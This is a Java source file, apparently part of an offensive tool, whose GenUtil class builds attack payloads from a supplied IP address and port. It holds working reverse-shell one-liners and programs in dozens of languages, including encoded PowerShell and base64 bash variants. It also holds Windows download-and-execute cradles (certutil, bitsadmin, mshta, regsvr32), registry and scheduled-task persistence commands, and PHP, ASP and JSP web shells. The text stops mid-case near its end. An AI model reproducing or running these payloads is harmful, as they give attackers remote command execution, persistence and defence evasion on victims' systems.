package org.mago;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class GenUtil {

    public static ShellCmd generate(OptData options) {
        String command;
        String ip = options.getIpAddress();
        int port = options.getPort();
        String osType = options.getOsType();
        String shellType = options.getShellType();

        switch (osType.toLowerCase()) {
            case "linux" -> command = genLinux(ip, port, shellType);
            case "windows" -> command = genWin(ip, port, shellType);
            case "web" -> command = genWeb(ip, port, shellType);
            default -> command = "Unsupported OS type";
        }
        return new ShellCmd(command);
    }

    private static String genLinux(String ip, int port, String shellType) {
        return switch (shellType.toLowerCase()) {
            case "bash" -> String.format("bash -i >& /dev/tcp/%s/%d 0>&1", ip, port);

            case "bash_udp" -> String.format("bash -i >& /dev/udp/%s/%d 0>&1", ip, port);

            case "sh_tcp" -> String.format("sh -i >& /dev/tcp/%s/%d 0>&1", ip, port);

            case "sh_udp" -> String.format("sh -i >& /dev/udp/%s/%d 0>&1", ip, port);


            case "python" -> String.format(
                    "python -c 'import socket,os,pty; s=socket.socket();s.connect((\"%s\",%d)); " +
                            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")'", ip, port);

            case "python3" -> String.format("python3 -c 'import socket,os,pty; s=socket.socket();s.connect((\"%s\",%d)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")'", ip, port);

            case "python_websocket" -> String.format(
                    "python3 -c 'import websocket; import os; ws = websocket.WebSocket(); ws.connect(\"ws://%s:%d\"); os.dup2(ws.fileno(),0); os.dup2(ws.fileno(),1); os.dup2(ws.fileno(),2); os.system(\"/bin/sh\")'",
                    ip, port);


            case "perl" -> String.format(
                    "perl -e 'use Socket;$i=\"%s\";$p=%d; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); " +
                            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); " +
                            "open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};'", ip, port);

            case "ruby" -> String.format(
                    "ruby -rsocket -e 'exit if fork; c=TCPSocket.new(\"%s\",%d); while(cmd=c.gets); " +
                            "IO.popen(cmd,\"r\"){|io|c.print io.read} end'", ip, port);

            case "ruby_tls" -> String.format("ruby -rsocket -ropenssl -e 'exit if fork; c=TCPSocket.new(\"%s\", %d); ssl_context = OpenSSL::SSL::SSLContext.new; ssl_sock = OpenSSL::SSL::SSLSocket.new(c, ssl_context); ssl_sock.sync_close = true; ssl_sock.connect; while(cmd = ssl_sock.gets); IO.popen(cmd,\"r\"){|io|ssl_sock.print io.read} end'", ip, port);

            case "perl_ipv6" -> String.format("perl -MIO::Socket::INET6 -e '$s=new IO::Socket::INET6(PeerAddr,\"[%s]\",PeerPort,%d,Proto,\"tcp\"); while(<$s>) { system($_); }'", ip, port);

            case "socat_ssl" -> String.format("socat OPENSSL:%s:%d,verify=0 EXEC:/bin/sh", ip, port);

            case "ncat_ssl" -> String.format("ncat --ssl -e /bin/sh %s %d", ip, port);

            case "nc" -> String.format("nc -e /bin/sh %s %d", ip, port);

            case "curl" -> String.format("curl http://%s:%d/shell.sh | bash", ip, port);

            case "mkfifo" -> String.format(
                    "mkfifo /tmp/f; nc %s %d 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f", ip, port);

            case "php" -> String.format(
                    "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ip, port);

            case "xterm" -> String.format("xterm -display %s:%d", ip, port);

            case "ksh" -> String.format("ksh -c 'sh -i >& /dev/tcp/%s/%d 0>&1'", ip, port);

            case "dash" -> String.format("dash -c 'sh -i >& /dev/tcp/%s/%d 0>&1'", ip, port);

            case "nodejs" -> String.format(
                    "var net = require('net');\n" +
                            "var client = new net.Socket();\n" +
                            "client.connect(%d, '%s', function() {\n" +
                            "    client.write('Connected!\\n');\n" +
                            "    process.stdin.pipe(client);\n" +
                            "    client.pipe(process.stdout);\n" +
                            "});",
                    port, ip
            );

            case "nodejs_udp" -> String.format("var dgram = require('dgram'); var client = dgram.createSocket('udp4'); client.send('Hello from Node!', %d, '%s');", port, ip);
            case "bash_base64" -> {
                String command = String.format("bash -i >& /dev/tcp/%s/%d 0>&1", ip, port);
                String base64Command = Base64.getEncoder().encodeToString(command.getBytes(StandardCharsets.UTF_8));
                yield String.format("bash -c \"$(echo %s | base64 -d)\"", base64Command);
            }
            case "r" -> String.format("Rscript -e 'con <- socketConnection(host = \"%s\", port = %d, server = FALSE, blocking = TRUE); sink(con); while(TRUE) { eval(parse(text = readLines(con, warn = FALSE)))}'", ip, port);
            case "dart" -> String.format("echo 'import \"dart:io\"; main() async { Socket.connect(\"%s\", %d).then((socket) { socket.listen((data) => print(utf8.decode(data))); }); }' > /tmp/shell.dart && dart /tmp/shell.dart", ip, port);
            case "bash_env" -> String.format("export RHOST=\"%s\"; export RPORT=%d; bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1", ip, port);
            case "nim" -> String.format(
                    "import net, os\n" +
                            "let sock = newSocket()\n" +
                            "sock.connect(\"%s\", Port(%d))\n" +
                            "let f = startProcess(\"/bin/sh\", options = {poUsePath})\n" +
                            "f.input = sock\n" +
                            "f.output = sock\n" +
                            "waitFor f",
                    ip, port
            );

            case "awk_tcp" -> String.format("awk 'BEGIN {s = \"/inet/tcp/0/%s/%d\"; while(1) { print |& s; if ((getline <&s) <= 0) break; close(s); }}' /dev/null", ip, port);

            case "awk_udp" -> String.format("awk 'BEGIN {s = \"/inet/udp/0/%s/%d\"; while(1) { print |& s; if ((getline <&s) <= 0) break; close(s); }}' /dev/null", ip, port);


            case "go" -> String.format(
                    "echo 'package main; import (\"net\"; \"os\"; \"os/exec\"); func main() { c, _ := net.Dial(\"tcp\", \"%s:%d\"); cmd := exec.Command(\"/bin/sh\"); cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c; cmd.Run() }' > /tmp/rs.go && go run /tmp/rs.go",
                    ip, port);

            case "c" -> String.format("""
                #include <stdio.h>
                #include <sys/socket.h>
                #include <arpa/inet.h>
                #include <unistd.h>

                int main() {
                    int sock;
                    struct sockaddr_in server;
                    char *argv[] = {"/bin/sh", NULL};
                    sock = socket(AF_INET, SOCK_STREAM, 0);
                    server.sin_addr.s_addr = inet_addr("%s");
                    server.sin_family = AF_INET;
                    server.sin_port = htons(%d);
                    connect(sock, (struct sockaddr *)&server, sizeof(server));
                    dup2(sock, 0);
                    dup2(sock, 1);
                    dup2(sock, 2);
                    execve("/bin/sh", argv, NULL);
                    return 0;
                }
                """, ip, port);

            case "prolog" -> String.format("""
            open_socket("%s", %d) :-
                setup_call_cleanup(tcp_socket(Socket), 
                                   tcp_connect(Socket, "%s":%d), 
                                   tcp_close_socket(Socket)),
                tcp_open_socket(Socket, In, Out),
                set_stream(In, buffer(false)),
                repeat,
                read_line_to_string(In, Command),
                shell(Command, 0),
                write(Out, Result),
                nl(Out),
                flush_output(Out),
                Command == "exit",
                !.
            """, ip, port, ip, port);

            case "erlang" -> String.format("""
            -module(reverse).
            -export([connect/0]).
            connect() ->
                {ok, Sock} = gen_tcp:connect("%s", %d, [binary, {packet, 0}, {active, false}]),
                shell(Sock).
        
            shell(Sock) ->
                receive
                    {tcp, Sock, Data} ->
                        Cmd = binary_to_list(Data),
                        {ok, Result} = os:cmd(Cmd),
                        gen_tcp:send(Sock, list_to_binary(Result)),
                        shell(Sock);
                    {tcp_closed, Sock} ->
                        ok
                end.
            """, ip, port);

            case "crystal" -> String.format("""
            require "socket"
            socket = TCPSocket.new("%s", %d)
            loop do
              cmd = socket.gets
              IO.popen(cmd) { |io| socket << io.read }
            end
            """, ip, port);

            case "racket" -> String.format("""
            #lang racket
            (require racket/tcp)
            (define-values (in out) (tcp-connect "%s" %d))
            (let loop ()
              (define cmd (read-line in))
              (define result (with-output-to-string (lambda () (system cmd))))
              (write result out)
              (loop))
            """, ip, port);

            case "julia" -> String.format("""
            using Sockets
            conn = connect("%s", %d)
            while true
                cmd = readline(conn)
                result = read(`$cmd`, String)
                write(conn, result)
            end
            """, ip, port);

            case "d" -> String.format("""
            import std.socket, std.process;
            void main() {
                auto socket = new TcpSocket();
                socket.connect(new InternetAddress("%s", %d));
                foreach (cmd; socket.receiveAll(1024)) {
                    auto result = executeShell(cmd);
                    socket.send(result.output);
                }
                socket.close();
            }
            """, ip, port);

            case "smalltalk" -> String.format("""
            Socket remoteAddress: '%s' port: %d do: [:socket |
                [| cmd result |
                [socket isConnected] whileTrue: [
                    cmd := socket nextLine.
                    result := (OSProcess command: cmd) output.
                    socket nextPutAll: result; flush.
                ]] ensure: [socket close].
            ]
          """, ip, port);


            case "scheme" -> String.format("""
            (use gauche.net)
            (let loop ((socket (socket-connect "%s" %d)))
              (let ((cmd (read-line socket)))
                (write-line (system cmd) socket)
                (loop socket)))
            """, ip, port);

            case "rust" -> String.format("echo 'use std::net::TcpStream;use std::io::{Read, Write};fn main() { let mut s = TcpStream::connect(\"%s:%d\").unwrap(); loop { let mut buf = [0; 1024]; let n = s.read(&mut buf).unwrap(); if n == 0 { break } let cmd = std::str::from_utf8(&buf[..n]).unwrap(); let output = std::process::Command::new(\"/bin/sh\").arg(\"-c\").arg(cmd).output().unwrap(); s.write_all(&output.stdout).unwrap(); }}' > /tmp/shell.rs && rustc /tmp/shell.rs -o /tmp/shell && /tmp/shell", ip, port);
            case "vlang" -> String.format(
                    "v run -e 'import net; import os; fn main() { mut s := net.dial_tcp(\"%s:%d\") or { return }; s.write_string(\"Vlang shell\") or {{}}; os.exec(\"/bin/sh -i\") }'",
                    ip, port);
            case "groovy" -> String.format(
                    "groovy -e \"def s=new Socket('%s',%d);def p=s.getInputStream();def e=s.getOutputStream();def m=new ByteArrayOutputStream();while(p.read(m)!=-1){e.write(m.toByteArray())}\"",
                    ip, port);
            case "scala" -> String.format(
                    "scala -e \"val s = new java.net.Socket(\"%s\", %d); val p = new java.io.PrintWriter(s.getOutputStream, true); val in = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream)); while(true) { val cmd = in.readLine; if(cmd != null) { val proc = Runtime.getRuntime.exec(cmd); val out = new BufferedReader(new InputStreamReader(proc.getInputStream)); while(out.ready()) p.println(out.readLine); } }\"",
                    ip, port);

            case "busybox" -> String.format("busybox nc %s %d -e /bin/sh", ip, port);
            case "tmux" -> String.format(
                    "tmux new-session -d 'bash -i >& /dev/tcp/%s/%d 0>&1'",
                    ip, port);
            case "screen" -> String.format(
                    "screen -dm bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'",
                    ip, port);


            case "lua" -> String.format(
                    "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%d');" +
                            "os.execute('/bin/sh -i <&3 >&3 2>&3')\"", ip, port);

            case "socat" -> String.format(
                    "socat TCP:%s:%d EXEC:/bin/sh", ip, port);

            case "gawk" -> String.format(
                    "gawk -v IP=%s -v PORT=%d 'BEGIN {s = \"/inet/tcp/0/\" IP \"/\" PORT; " +
                            "while(1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break; while((c |& getline) > 0) " +
                            "print |& s; close(c)}}'", ip, port);

            case "java" -> String.format(
                    "r = new java.net.Socket(\"%s\", %d); p = new java.lang.ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); " +
                            "c = p.getInputStream(); o = p.getOutputStream(); i = r.getInputStream(); o.write(i.readAllBytes()); c.readAllBytes(); o.close(); c.close();", ip, port);

            case "elixir" -> String.format("elixir -e ':gen_tcp.connect({%s,%d}, &sh/1) |> :ok'", ip, port);
            case "clojure" -> String.format("clojure -e '(let [s (. (java.net.Socket. \"%s\" %d) getOutputStream) p (. (java.lang.ProcessBuilder. [\"/bin/sh\" \"-i\"]) start)] (doseq [i (range)] (. s write (. p getInputStream))) (. s flush))'", ip, port);
            case "tcl" -> String.format("echo 'package require Tclx; set s [socket %s %d]; while {1} { set c [gets $s]; catch {exec /bin/sh -c $c} r; puts $s $r }' | tclsh", ip, port);
            case "haskell" -> String.format(
                    "echo 'import System.IO;import System.Process;import Network.Socket;main=do " +
                            "{ sock <- socket AF_INET Stream defaultProtocol; connect sock (SockAddrInet %d (tupleToHostAddress (ipToTuple \"%s\"))); " +
                            "h <- socketToHandle sock ReadWriteMode; hSetBuffering h NoBuffering; hGetContents h >>= \\x -> " +
                            "withFile x (Just Handle) (\\\\y -> forkIO (hPutStrLn h =<< readProcess \"sh\" [\"-c\",x] [])) }' > shell.hs && runhaskell shell.hs",
                    port, ip
            );

            case "zsh" -> String.format(
                    "zsh -c 'zmodload zsh/net/tcp && ztcp %s %d && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'", ip, port);

            case "telnet" -> String.format(
                    "rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p", ip, port);



            case "openssl" -> String.format(
                    "mkfifo /tmp/f; openssl s_client -quiet -connect %s:%d < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f", ip, port);

            case "docker" -> String.format(
                    "docker run -it --rm alpine sh -c \"apk add socat; socat TCP:%s:%d EXEC:/bin/sh\"", ip, port);


            default -> "Unsupported Linux shell type";
        };
    }


    private static String genWin(String ip, int port, String shellType) {
        return switch (shellType.toLowerCase()) {
            case "powershell_basic" -> String.format(
                    "powershell -NoP -NonI -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$b = 0..65535|%%{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0) { $d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $s = (iex $d 2>&1 | Out-String); $s += 'PS ' + (pwd).Path + '> '; $sb = ([text.encoding]::ASCII).GetBytes($s); $stream.Write($sb,0,$sb.Length); $stream.Flush() }; $client.Close()\"",
                    ip, port);

            case "powershell_encoded" -> {
                String cmd = String.format(
                        "$client = New-Object System.Net.Sockets.TCPClient('%s',%d); $stream = $client.GetStream(); [byte[]]$b = 0..65535|%%{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0) { $d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $s = (iex $d 2>&1 | Out-String); $s += 'PS ' + (pwd).Path + '> '; $sb = ([text.encoding]::ASCII).GetBytes($s); $stream.Write($sb,0,$sb.Length); $stream.Flush() }; $client.Close()",
                        ip, port);
                String encoded = Base64.getEncoder().encodeToString(cmd.getBytes(StandardCharsets.UTF_16LE));
                yield String.format("powershell -NoP -NonI -Exec Bypass -EncodedCommand %s", encoded);
            }

            case "powershell_bind_tcp" -> String.format(
                    "$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, %d);" +
                            "$listener.Start();" +
                            "$client = $listener.AcceptTcpClient();" +
                            "$stream = $client.GetStream();" +
                            "$writer = New-Object System.IO.StreamWriter($stream);" +
                            "$reader = New-Object System.IO.StreamReader($stream);" +
                            "while ($true) {" +
                            "    $writer.Write('PS ' + (pwd).Path + '> ');" +
                            "    $writer.Flush();" +
                            "    $command = $reader.ReadLine();" +
                            "    if ($command -eq 'exit') { break };" +
                            "    $output = (Invoke-Expression -Command $command 2>&1 | Out-String);" +
                            "    $writer.WriteLine($output);" +
                            "    $writer.Flush();" +
                            "};" +
                            "$client.Close();" +
                            "$listener.Stop();", port);



            case "powershell_udp" -> String.format(
                    "$udpClient = New-Object System.Net.Sockets.UdpClient(%d);" +
                            "$endPoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, %d);" +
                            "while ($true) {" +
                            "    $receivedBytes = $udpClient.Receive([ref]$endPoint);" +
                            "    $command = [System.Text.Encoding]::ASCII.GetString($receivedBytes);" +
                            "    if ($command -eq 'exit') { break };" +
                            "    $output = (Invoke-Expression -Command $command 2>&1 | Out-String);" +
                            "    $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($output);" +
                            "    $udpClient.Send($sendBytes, $sendBytes.Length, $endPoint);" +
                            "};" +
                            "$udpClient.Close();", port, port);


            case "msbuild_proj" -> String.format("""
            <Project DefaultTargets="Run" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
              <Target Name="Run">
                <Exec Command="cmd.exe /c powershell -NoP -NonI -Exec Bypass -Command &quot;$client = New-Object System.Net.Sockets.TCPClient('%s', %d); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535 | %% {0}; while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead); $sendback = (iex $data 2&gt;&amp;1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); }; $client.Close()&quot;" />
              </Target>
            </Project>
    """, ip, port);

            case "vbs" -> String.format("""
                Set objShell = CreateObject("WScript.Shell")
                Set objExec = objShell.Exec("cmd.exe /c powershell -NoP -NonI -Exec Bypass -Command \\"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback += 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\\"")
                """, ip, port);

            case "invoke_wmi" -> String.format(
                    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"powershell -NoP -NonI -W Hidden -Exec Bypass -Command `\"IEX (New-Object Net.WebClient).DownloadString('http://%s:%d/shell.ps1')`\"\"",
                    ip, port
            );


            case "registry" -> String.format("""
                reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyShell /t REG_SZ /d "powershell -NoP -NonI -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/shell.ps1')" /f
                """, ip, port);

            case "schtasks" -> String.format(
                    "schtasks /create /tn MyShell /tr \"cmd.exe /c powershell -NoP -NonI -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/shell.ps1')\" /sc onlogon",
                    ip, port);

            case "msiexec" -> String.format(
                    "msiexec /q /i http://%s:%d/shell.msi",
                    ip, port);

            case "c#" -> String.format("""
                using System;
                using System.Net.Sockets;
                using System.IO;
                public class RShell {
                    public static void Main() {
                        using (TcpClient tcp = new TcpClient("%s", %d)) {
                            using (NetworkStream ns = tcp.GetStream()) {
                                using (StreamReader sr = new StreamReader(ns)) {
                                    using (StreamWriter sw = new StreamWriter(ns)) {
                                        while (true) {
                                            sw.Write("%s> ");
                                            sw.Flush();
                                            string cmd = sr.ReadLine();
                                            if (cmd.ToLower() == "exit") break;
                                            string output = new System.Diagnostics.Process {
                                                StartInfo = new System.Diagnostics.ProcessStartInfo {
                                                    FileName = "cmd.exe",
                                                    Arguments = "/c " + cmd,
                                                    RedirectStandardOutput = true,
                                                    RedirectStandardError = true,
                                                    UseShellExecute = false,
                                                    CreateNoWindow = true
                                                }
                                            }.Start().StandardOutput.ReadToEnd();
                                            sw.WriteLine(output);
                                            sw.Flush();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                """, ip, port, ip);

            case ".net" -> String.format("""
                using System;
                using System.Net.Sockets;
                using System.Text;
                public class DNetShell {
                    public static void Main() {
                        byte[] buf = new byte[4096];
                        using (TcpClient tcp = new TcpClient("%s", %d)) {
                            using (NetworkStream ns = tcp.GetStream()) {
                                while (true) {
                                    int len = ns.Read(buf, 0, buf.Length);
                                    if (len == 0) break;
                                    string cmd = Encoding.ASCII.GetString(buf, 0, len).Trim();
                                    if (cmd == "exit") break;
                                    string output = new System.Diagnostics.Process {
                                        StartInfo = new System.Diagnostics.ProcessStartInfo {
                                            FileName = "cmd.exe",
                                            Arguments = "/c " + cmd,
                                            RedirectStandardOutput = true,
                                            RedirectStandardError = true,
                                            UseShellExecute = false,
                                            CreateNoWindow = true
                                        }
                                    }.Start().StandardOutput.ReadToEnd();
                                    byte[] result = Encoding.ASCII.GetBytes(output);
                                    ns.Write(result, 0, result.Length);
                                }
                            }
                        }
                    }
                }
                """, ip, port);
            case "python_win" -> String.format(
                    "import socket\n" +
                            "import subprocess\n" +
                            "s = socket.socket()\n" +
                            "s.connect(('%s', %d))\n" +
                            "subprocess.call(['cmd.exe'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())",
                    ip, port);

            case "batch" -> String.format(
                    "@echo off\n" +
                            "powershell -NoP -NonI -W Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d); " +
                            "$stream = $client.GetStream(); [byte[]]$buffer = 0..65535 | %% {0}; while (($i = $stream.Read($buffer, 0, " +
                            "$buffer.Length)) -ne 0) { $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); " +
                            "$sendback = (iex $d 2>&1 | Out-String); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); " +
                            "$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()\"",
                    ip, port);

            case "autolt" -> String.format("""
                #include <INet.au3>
                #include <Array.au3>
                
                Global $ip = "%s"
                Global $port = %d
                Global $socket = _INetTCPConnect($ip, $port)
                
                If $socket <> -1 Then
                    While True
                        Local $command = _INetTCPRecv($socket, 1024)
                        If @error Or StringStripWS($command, 1) == "exit" Then ExitLoop
                
                        Local $result = Run(@ComSpec & " /c " & $command, "", @SW_HIDE, $STDOUT_CHILD + $STDERR_CHILD)
                        Local $output = ""
                        While 1
                            $output &= StdoutRead($result, False, True)
                            If @error Then ExitLoop
                        WEnd
                
                        _INetTCPSend($socket, $output)
                    WEnd
                    _INetTCPCloseSocket($socket)
                EndIf
                """, ip, port);

            case "java_win" -> String.format(
                    "import java.net.*;\n" +
                            "import java.io.*;\n" +
                            "public class Main {\n" +
                            "    public static void main(String[] args) throws Exception {\n" +
                            "        Socket s = new Socket(\"%s\", %d);\n" +
                            "        Process p = new ProcessBuilder(\"cmd.exe\").redirectErrorStream(true).start();\n" +
                            "        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" +
                            "        OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" +
                            "        while (!s.isClosed()) {\n" +
                            "            while (pi.available() > 0) so.write(pi.read());\n" +
                            "            while (pe.available() > 0) so.write(pe.read());\n" +
                            "            while (si.available() > 0) po.write(si.read());\n" +
                            "            so.flush();\n" +
                            "            po.flush();\n" +
                            "            Thread.sleep(50);\n" +
                            "        }\n" +
                            "        p.destroy();\n" +
                            "        s.close();\n" +
                            "    }\n" +
                            "}", ip, port);


            case "wscript" -> String.format("""
        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
        objXMLHTTP.open "GET", "http://%s:%d/shell.exe", false
        objXMLHTTP.send
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.responseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile "shell.exe", 2
        objADOStream.Close
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "shell.exe"
        """, ip, port);
            case "c++" -> String.format("""
                #include <iostream>
                #include <winsock2.h>
                #pragma comment(lib, "ws2_32.lib")
                int main() {
                    WSADATA wsa;
                    SOCKET s;
                    struct sockaddr_in server;
                    char buf[4096];
                    WSAStartup(MAKEWORD(2,2), &wsa);
                    s = socket(AF_INET, SOCK_STREAM, 0);
                    server.sin_addr.s_addr = inet_addr("%s");
                    server.sin_family = AF_INET;
                    server.sin_port = htons(%d);
                    connect(s, (struct sockaddr *)&server, sizeof(server));
                    send(s, "Connected!\\n", strlen("Connected!\\n"), 0);
                    while (1) {
                        memset(buf, 0, sizeof(buf));
                        recv(s, buf, sizeof(buf) - 1, 0);
                        FILE *fp = _popen(buf, "r");
                        while (fgets(buf, sizeof(buf), fp) != NULL) {
                            send(s, buf, strlen(buf), 0);
                        }
                        _pclose(fp);
                    }
                    closesocket(s);
                    WSACleanup();
                    return 0;
                }
                """, ip, port);

            case "powershell_iex" -> String.format(
                    "powershell -NoP -NonI -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/shell.ps1')\"",
                    ip, port);

            case "nc" -> String.format("nc.exe -e cmd.exe %s %d", ip, port);


            case "mshta" -> String.format("mshta http://%s:%d/shell.hta", ip, port);

            case "revdll" -> String.format("rundll32.exe http://%s:%d/reverse.dll,EntryPoint", ip, port);

            case "scriptrunner" -> String.format(
                    "scriptrunner.exe \\\\%s\\scripts\\payload.bat", ip);

            case "php" -> String.format("<?php\n" +
                    "$ip = '%s';\n" +
                    "$port = %d;\n" +
                    "$sock = fsockopen($ip, $port);\n" +
                    "if ($sock) {\n" +
                    "    fwrite($sock, \"Connected!\\n\");\n" +
                    "    while (!feof($sock)) {\n" +
                    "        $command = fread($sock, 1024);\n" +
                    "        if (trim($command) === 'exit') break;\n" +
                    "        $output = shell_exec($command . ' 2>&1');\n" +
                    "        fwrite($sock, $output);\n" +
                    "    }\n" +
                    "    fclose($sock);\n" +
                    "}\n" +
                    "?>", ip, port);


            case "wmic" -> String.format(
                    "wmic process call create \"powershell -NoP -NonI -Exec Bypass -C IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/payload.ps1')\"",
                    ip, port);

            case "regsvr32" -> String.format(
                    "regsvr32 /s /n /u /i:http://%s:%d/file.sct scrobj.dll",
                    ip, port);

            case "rundll32_in_mem" -> String.format(
                    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();window.location='http://%s:%d/payload.js';",
                    ip, port);

            case "bitsadmin" -> String.format(
                    "bitsadmin /transfer myDownloadJob /download /priority high http://%s:%d/shell.exe %%temp%%\\shell.exe & %%temp%%\\shell.exe",
                    ip, port);

            case "curl" -> String.format("curl http://%s:%d/shell.exe -o shell.exe && shell.exe", ip, port);
            case "certutil" -> String.format(
                    "certutil -urlcache -split -f http://%s:%d/shell.exe shell.exe & shell.exe",
                    ip, port);

            default -> "Unsupported Windows shell type";
        };
    }




    private static String genWeb(String ip, int port, String shellType) {
        return switch (shellType.toLowerCase()) {
            case "php_basic" -> "<?php system($_GET['cmd']); ?>";
            case "php_reverse" -> String.format("<?php $sock=fsockopen('%s',%d); exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", ip, port);
            case "php_eval" -> "<?php eval($_POST['cmd']); ?>";
            case "php_passthru" -> "<?php passthru($_GET['cmd']); ?>";
            case "php_shell_exec" -> "<?php echo shell_exec($_POST['cmd']); ?>";
            case "php_backconnect" -> String.format("<?php $sock=fsockopen('%s', %d); while($c=fread($sock, 2048)){ $out=shell_exec($c); fwrite($sock, $out); } fclose($sock); ?>", ip, port);

            case "asp_basic" -> "<% eval request(\"cmd\") %>";
            case "asp_reverse" -> String.format("<script language=\"VBScript\"> Set objShell = CreateObject(\"WScript.Shell\") : objShell.Run \"cmd /c powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('%s',%d); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\\\"\" : objShell = Nothing </script>", ip, port);

            case "jsp_basic" -> "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>";
            case "jsp_reverse" -> String.format("<%%@ page import=\"java.io.*, java.net.*\" %%><%% Socket s = new Socket(\"%s\", %d); Process p = Runtime.getRuntime().exec(\"/bin/sh -i\"); InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while (!s.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (pe.available() > 0) so.write(pe.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); } p.destroy(); s.close(); %%>", ip, port);

            case "php_socket_reverse" -> String.format("<?php $sock=socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect($sock, '%s', %d); while($c=socket_read($sock, 2048)) { $out=shell_exec($c); socket_write($sock, $out, strlen($out)); } socket_close($sock); ?>", ip, port);


            case "python_django" -> String.format(
                    "from django.http import HttpResponse\n" +
                            "import subprocess\n" +
                            "def shell(request):\n" +
                            "    cmd = request.GET.get('cmd', '')\n" +
                            "    output = subprocess.check_output(cmd, shell=True, text=True)\n" +
                            "    return HttpResponse(output)\n"
            );

            case "asp_net_core" -> String.format(
                    "using Microsoft.AspNetCore.Mvc;\n" +
                            "using System.Diagnostics;\n" +
                            "public class ShellController : Controller {\n" +
                            "    public IActionResult Run(string cmd) {\n" +
                            "        var process = new Process {\n" +
                            "            StartInfo = new ProcessStartInfo {\n" +
                            "                FileName = \"cmd.exe\",\n" +
                            "                Arguments = \"/c \" + cmd,\n" +
                            "                RedirectStandardOutput = true,\n" +
                            "                UseShellExecute = false,\n" +
                            "                CreateNoWindow = true\n" +
                            "            }\n" +
                            "        };\n" +
                            "        process.Start();\n" +
                            "        var output = process.StandardOutput.ReadToEnd();\n" +
                            "        return Content(output);\n" +
                            "    }\n" +
                            "}\n"
            );

            case "tomcat_jsp" -> String.format(
                    "<%%@ page import=\"java.io.*, java.util.*\" %%>\n" +
